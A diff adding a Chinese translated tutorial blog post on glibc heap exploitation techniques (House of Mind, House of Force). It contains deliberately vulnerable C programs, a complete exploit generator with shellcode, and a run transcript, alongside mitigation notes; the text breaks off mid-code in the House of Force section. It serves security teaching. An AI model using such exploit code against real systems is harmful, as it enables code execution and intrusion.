@@ -108,6 +108,257 @@
         
           <section id="main">
   
+    <article id="post-maleficarum"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170104/maleficarum/">Malloc Maleficarum堆溢出</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170104/maleficarum/" class="article-date">
+	  <time datetime="2017-01-04T15:10:09.000Z" itemprop="datePublished">一月 4, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/maleficarum" target="_blank" rel="external">Linux(X86)漏洞利用系列-Malloc Maleficarum堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0X01 House of Mind</li>
+<li>0X02 House of Force</li>
+<li>0x03 House of Spirit</li>
+</ul>
+</blockquote>
+<p><u>阅读基础</u>:</p>
+<ul>
+<li><ol>
+<li><a href="http://www.csyssec.org/20170104/glibcmalloc/" target="_blank" rel="external">深入理解glibc malloc</a></li>
+</ol>
+</li>
+</ul>
+<p>在2004后期，’glibc malloc’ 被强化. 像unlink类似的一些技术过时后，攻击者变得无所适从。但仅在2005年后期，’Phantasmal Phatasmagoria’又开始提出下面的一系列技术来成功利用堆溢出。</p>
+<ul>
+<li>House of Prime</li>
+<li>House of Mind </li>
+<li>House of Force</li>
+<li>House of Lore</li>
+<li>House of Spirit</li>
+</ul>
+<h3 id="0X01-House-of-Mind"><a href="#0X01-House-of-Mind" class="headerlink" title="0X01 House of Mind"></a>0X01 House of Mind</h3><p>通过这项技术，攻击者利用构造的假arena( Fake Arena)来欺骗’glibc malloc’。通过构造假的arena以让未排序bin的fd含有free的GOT表项地址(12)。 如此一来，漏洞程序中释放的free函数的GOT表项被shellcode地址覆盖。成功覆盖GOT之后，任何时候调用漏洞程序的free函数，shellcode就会执行。</p>
+<p><u>假设条件</u>: 由于不是所有的堆溢出漏洞程序都能被house of mind技术成功利用，以下是成功利用的假设条件：</p>
+<ul>
+<li>1.调用一系列malloc，直到一个chunk的地址对其多倍的HEAP_MAX_SIZE，进而生成一块内存区域能被攻击者控制。在这块内存区域里，可以发现假的heap_info结构体。假的heap_info的arena指针ar_ptr将会指向假的arena。这样一来，假的arena和heap_info内存区域都会被攻击者控制。</li>
+<li>2.Size域(其arena指针是prereq 1)被攻击者控制的一个chunk必须要释放。</li>
+<li><ol>
+<li>紧邻上述被释放chunk的下一个chunk不能是一个top chunk.</li>
+</ol>
+</li>
+</ul>
+<p><u>漏洞程序</u>：这个漏洞程序满足上述假设条件</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* vuln.c</span></div><div class="line"> House of Mind vulnerable program</div><div class="line"> */</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> *ptr = <span class="built_in">malloc</span>(<span class="number">1024</span>); <span class="comment">/* First allocated chunk */</span></div><div class="line"> <span class="keyword">char</span> *ptr2; <span class="comment">/* Second chunk/Last but one chunk */</span></div><div class="line"> <span class="keyword">char</span> *ptr3; <span class="comment">/* Last chunk */</span></div><div class="line"> <span class="keyword">int</span> heap = (<span class="keyword">int</span>)ptr &amp; <span class="number">0xFFF00000</span>;</div><div class="line"> <span class="keyword">_Bool</span> found = <span class="number">0</span>;</div><div class="line"> <span class="keyword">int</span> i = <span class="number">2</span>;</div><div class="line"></div><div class="line"> <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt; <span class="number">1024</span>; i++) &#123;</div><div class="line">   <span class="comment">/* Prereq 1: Series of malloc calls until a chunk's address - when aligned to HEAP_MAX_SIZE results in 0x08100000 */</span></div><div class="line">   <span class="comment">/* 0x08100000 is the place where fake heap_info structure is found. */</span></div><div class="line">   [<span class="number">1</span>]<span class="keyword">if</span> (!found &amp;&amp; (((<span class="keyword">int</span>)(ptr2 = <span class="built_in">malloc</span>(<span class="number">1024</span>)) &amp; <span class="number">0xFFF00000</span>) == \</div><div class="line">      (heap + <span class="number">0x100000</span>))) &#123;</div><div class="line">     <span class="built_in">printf</span>(<span class="string">"good heap allignment found on malloc() %i (%p)\n"</span>, i, ptr2);</div><div class="line">     found = <span class="number">1</span>;</div><div class="line">     <span class="keyword">break</span>;</div><div class="line">   &#125;</div><div class="line"> &#125;</div><div class="line"> [<span class="number">2</span>]ptr3 = <span class="built_in">malloc</span>(<span class="number">1024</span>); <span class="comment">/* Last chunk. Prereq 3: Next chunk to ptr2 != av-&gt;top */</span></div><div class="line"> <span class="comment">/* User Input. */</span></div><div class="line"> [<span class="number">3</span>]fread (ptr, <span class="number">1024</span> * <span class="number">1024</span>, <span class="number">1</span>, <span class="built_in">stdin</span>);</div><div class="line"></div><div class="line"> [<span class="number">4</span>]<span class="built_in">free</span>(ptr2); <span class="comment">/* Prereq 2: Freeing a chunk whose size and its arena pointer is controlled by the attacker. */</span></div><div class="line"> [<span class="number">5</span>]<span class="built_in">free</span>(ptr3); <span class="comment">/* Shell code execution. */</span></div><div class="line"> <span class="keyword">return</span>(<span class="number">0</span>); <span class="comment">/* Bye */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>上述漏洞程序的堆内存如下所示：</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/maleficarum1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/maleficarum1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+
+<p><strong>注：本系列所有文章中第[N]行代码指的的代码中显示/*[N]*/的位置。</strong></p>
+<p>漏洞程序中的第[3]行就是堆溢出发生的地方。用户输入存储在chunk1的内存指针处，共1MB大小。为了成功利用堆溢出，攻击者要按照以下顺序提供用户输入：</p>
+<ul>
+<li>Fake arena</li>
+<li>Junk</li>
+<li>Fake heap_info</li>
+<li>Shellcode</li>
+</ul>
+<p><u>漏洞利用程序</u>：这个程序生成攻击者的数据文件</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* exp.c</span></div><div class="line">Program to generate attacker data.</div><div class="line">Command:</div><div class="line">     #./exp &gt; file</div><div class="line">*/</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BIN1 0xb7fd8430</span></div><div class="line"></div><div class="line"><span class="keyword">char</span> scode[] =</div><div class="line"><span class="comment">/* Shellcode to execute linux command "id". Size - 72 bytes. */</span></div><div class="line"><span class="string">"\x31\xc9\x83\xe9\xf4\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e"</span></div><div class="line"><span class="string">"\xc9\x6a\x42\x83\xeb\xfc\xe2\xf4\x34\xc2\x32\xdb\x0c\xaf\x02\x6f"</span></div><div class="line"><span class="string">"\x3d\x40\x8d\x2a\x71\xba\x02\x42\x36\xe6\x08\x2b\x30\x40\x89\x10"</span></div><div class="line"><span class="string">"\xb6\xc5\x6a\x42\x5e\xe6\x1f\x31\x2c\xe6\x08\x2b\x30\xe6\x03\x26"</span></div><div class="line"><span class="string">"\x5e\x9e\x39\xcb\xbf\x04\xea\x42"</span>;</div><div class="line"></div><div class="line"><span class="keyword">char</span> ret_str[<span class="number">4</span>] = <span class="string">"\x00\x00\x00\x00"</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">convert_endianess</span><span class="params">(<span class="keyword">int</span> arg)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line">        ret_str[<span class="number">3</span>] = (arg &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>;</div><div class="line">        ret_str[<span class="number">2</span>] = (arg &amp; <span class="number">0x00FF0000</span>) &gt;&gt; <span class="number">16</span>;</div><div class="line">        ret_str[<span class="number">1</span>] = (arg &amp; <span class="number">0x0000FF00</span>) &gt;&gt; <span class="number">8</span>;</div><div class="line">        ret_str[<span class="number">0</span>] = (arg &amp; <span class="number">0x000000FF</span>) &gt;&gt; <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</div><div class="line"></div><div class="line">        fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fd */</span></div><div class="line">        fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bk */</span></div><div class="line">        fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fd_nextsize */</span></div><div class="line">        fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bk_nextsize */</span></div><div class="line">        <span class="comment">/* Fake Arena. */</span></div><div class="line">        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* mutex */</span></div><div class="line">        fwrite(<span class="string">"\x01\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* flag */</span></div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</div><div class="line">                fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fastbinsY */</span></div><div class="line">        fwrite(<span class="string">"\xb0\x0e\x10\x08"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* top */</span></div><div class="line">        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* last_remainder */</span></div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">127</span>;i++) &#123;</div><div class="line">                convert_endianess(BIN1+(i*<span class="number">8</span>));</div><div class="line">                <span class="keyword">if</span>(i == <span class="number">119</span>) &#123;</div><div class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* preserve prev_size */</span></div><div class="line">                        fwrite(<span class="string">"\x09\x04\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* preserve size */</span></div><div class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span>(i==<span class="number">0</span>) &#123;</div><div class="line">                        fwrite(<span class="string">"\xe8\x98\x04\x08"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bins[i][0] = (GOT(free) - 12) */</span></div><div class="line">                        fwrite(ret_str, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bins[i][1] */</span></div><div class="line">                &#125;</div><div class="line">                <span class="keyword">else</span> &#123;</div><div class="line">                        fwrite(ret_str, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bins[i][0] */</span></div><div class="line">                        fwrite(ret_str, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bins[i][1] */</span></div><div class="line">                &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</div><div class="line">                fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* binmap[i] */</span></div><div class="line">        &#125;</div><div class="line">        fwrite(<span class="string">"\x00\x84\xfd\xb7"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* next */</span></div><div class="line">        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* next_free */</span></div><div class="line">        fwrite(<span class="string">"\x00\x60\x0c\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* system_mem */</span></div><div class="line">        fwrite(<span class="string">"\x00\x60\x0c\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* max_system_mem */</span></div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">234</span>;i++) &#123;</div><div class="line">                fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span></div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">722</span>;i++) &#123;</div><div class="line">                <span class="keyword">if</span>(i==<span class="number">721</span>) &#123;</div><div class="line">                        <span class="comment">/* Chunk 724 contains the shellcode. */</span></div><div class="line">                        fwrite(<span class="string">"\xeb\x18\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* prev_size  - Jmp 24 bytes */</span></div><div class="line">                        fwrite(<span class="string">"\x0d\x04\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* size */</span></div><div class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fd */</span></div><div class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bk */</span></div><div class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fd_nextsize */</span></div><div class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bk_nextsize */</span></div><div class="line">                        fwrite(<span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span> \</div><div class="line">                        <span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="built_in">stdout</span>);  <span class="comment">/* NOPS */</span></div><div class="line">                        fwrite(scode, <span class="keyword">sizeof</span>(scode)<span class="number">-1</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* SHELLCODE */</span></div><div class="line">                        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">230</span>;j++)</div><div class="line">                                fwrite(<span class="string">"\x42\x42\x42\x42"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span></div><div class="line">                        <span class="keyword">continue</span>;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* prev_size */</span></div><div class="line">                        fwrite(<span class="string">"\x09\x04\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* size */</span></div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span>(i==<span class="number">720</span>) &#123;</div><div class="line">                        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">90</span>;j++)</div><div class="line">                                fwrite(<span class="string">"\x42\x42\x42\x42"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span></div><div class="line">                        fwrite(<span class="string">"\x18\xa0\x04\x08"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* Arena Pointer */</span></div><div class="line">                        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">165</span>;j++)</div><div class="line">                                fwrite(<span class="string">"\x42\x42\x42\x42"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span></div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">256</span>;j++)</div><div class="line">                                fwrite(<span class="string">"\x42\x42\x42\x42"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span></div><div class="line">                &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>攻击者生成数据文件作为用户输入，漏洞程序的堆内存变为如下所示：</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/maleficarum2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/maleficarum2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+
+<p>攻击者生成数据文件作为用户输入，当漏洞程序的第[4]行执行时，’glibc malloc’会做以下事情：</p>
+<ul>
+<li>调用arena_for_chunk 宏获取正被释放中的chunk的arena<ul>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L47" target="_blank" rel="external">arena_for_chunk</a>: 如果NON_MAIN_ARENA (N)位没有被设置，返回主arena(main arena)。如果已经设置，通过将chunk地址对其多倍的HEAP_MAX_SIZE访问相应的heap_info结构体。然后，返回获取heap_info结构体的arena指针。在我们的例子中，ON_MAIN_ARENA (N)被攻击者设置，所以得到了正要被释放的chunk的heap_info结构体(位于地址0x0810000处)。heap_info的ar_ptr = Fake arena的基地址(0x0804a018)。</li>
+</ul>
+</li>
+<li>以arena指针和chunk地址作为参数调用_int_free。在我们的例子中，arena指针指向fake arena， 因此fake arena和chun地址作为参数传递到_int_free。<ul>
+<li>Fake arena: 以下是fake arena中需要被攻击者覆盖的必要域:<pre><code>+ [Mutex](https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L14)- 必须处于解锁状态(unlocked state).
++ [Bins](https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L29)- 未排序的bin fd必须含有free函数的GOT表项地址-12
++ [Top](https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L23)- 
+        + Top地址必须不等于正被释放的chunk地址
+        + Top地址必须大于下一个chunk地址
++ [System Memory](https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L41)- System memory必须大于下一个chunk的size。
+</code></pre><ul>
+<li>_int_free():<ul>
+<li>如果chunk没有<a href="https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L68" target="_blank" rel="external">被映射</a>(non mmap’d)，获取锁。在我们的例子中，chunk没有被映射并且fake arena的mutex lock也被成功获取。</li>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L87" target="_blank" rel="external">合并</a>：<pre><code>+ 查找前一个chunk是否空闲，如果空闲，则合并。在我们的例子中，前一个chunk被分配，因此不能向后合并。
++ 查找下一个chunk是否空闲，如果空闲，则合并。在我们的例子中，下一个chunk被分配，因此可以向前合并。
+</code></pre></li>
+<li>将当前释放的chunk放入未被排序的bin中。在我们的例子中，fake arena的未排序bin的fs含有free函数的GOT表项地址（12），被拷贝到<a href="https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L100" target="_blank" rel="external">‘fwd’</a>中。之后，<a href="https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L109" target="_blank" rel="external">当前被释放的chunk的地址被拷贝到’fwd-&gt;bk’中</a>。 bk位于malloc_chunk的12偏移处，因此12加入到’fwd’值中(ie. free- 12+12)。现在free的GOT表项被当前释放的chunk地址修改。由于攻击者已经将shellcode放入到当前被释放的chunk中，从现在开始，只要free被调用，攻击者的shellcode就会执行。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>把攻击者的数据文件当做用户输入，执行上述漏洞代码，就会执行攻击者的shellcode，如下所示</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/hom$ gcc -g -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib -Wl,--dynamic-linker=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib/ld-linux.so<span class="number">.2</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/hom$ gcc -g -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c</div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/hom$ ./<span class="built_in">exp</span> &gt; file</div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/hom$ ./vuln &lt; file</div><div class="line">ptr found at <span class="number">0x804a008</span></div><div class="line">good heap allignment found on <span class="built_in">malloc</span>() <span class="number">724</span> (<span class="number">0x81002a0</span>)</div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) groups=<span class="number">1000</span>(sploitfun),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare)</div></pre></td></tr></table></figure>
+<p><u>保护</u>: 现如今，由于’glibc malloc’ 被强化(got hardened)， house of mind技术不再有效。为阻止house of mind带来的堆溢出，添加了一下检查：</p>
+<ul>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3990" target="_blank" rel="external">损坏的chunks</a>: 未排序的bin的第一个chunk的bk指针必须执行未排序的bin，否则，’glibc malloc’就会抛出一个损坏的chunk错误。</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</div><div class="line">        &#123;</div><div class="line">          errstr = <span class="string">"free(): corrupted unsorted chunks"</span>;</div><div class="line">          <span class="keyword">goto</span> errout;</div><div class="line">        &#125;</div></pre></td></tr></table></figure>
+<h3 id="0X02-House-of-Force"><a href="#0X02-House-of-Force" class="headerlink" title="0X02 House of Force"></a>0X02 House of Force</h3><p>通过这项技术，攻击者滥用top chunk的size，利用top chunk欺骗’glibc malloc’来服务大量的内存请求(比堆的系统内存大小要打)。如此一来，当发出一个新的malloc请求，free的GOT表项就会被shellcode地址覆盖。从现在开始，只要free被调用，shellcode就会执行。</p>
+<p><u>假设条件</u>: 需要三个malloc调用才能成功利用house of force 技术：</p>
+<ul>
+<li>Malloc 1: 攻击者必须能控制top chunk的大小。 这堆样就能在这个分配的chunk(物理上在top chunk前面)中溢出。</li>
+<li>Malloc 2: 攻击者必须能控制这个malloc请求的大小</li>
+<li>Malloc 3: 用户输入必须拷贝到这个已经分配的chunk中。</li>
+</ul>
+<p><u>漏洞程序</u>:这个漏洞程序满足上述假设条件.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">House of force vulnerable program. </div><div class="line">*/</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span> </span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">char</span> *buf1, *buf2, *buf3;</div><div class="line">        <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Usage Error\n"</span>);</div><div class="line">                <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        [<span class="number">1</span>]buf1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</div><div class="line">        [<span class="number">2</span>]<span class="built_in">strcpy</span>(buf1, argv[<span class="number">1</span>]); <span class="comment">/* Prereq 1 */</span></div><div class="line">        [<span class="number">3</span>]buf2 = <span class="built_in">malloc</span>(strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">16</span>)); <span class="comment">/* Prereq 2 */</span></div><div class="line">        [<span class="number">4</span>]buf3 = <span class="built_in">malloc</span>(<span class="number">256</span>); <span class="comment">/* Prereq 3 */</span></div><div class="line">        [<span class="number">5</span>]<span class="built_in">strcpy</span>(buf3, argv[<span class="number">3</span>]); <span class="comment">/* Prereq 3 */</span></div><div class="line"></div><div class="line">        [<span class="number">6</span>]<span class="built_in">free</span>(buf3);</div><div class="line">        <span 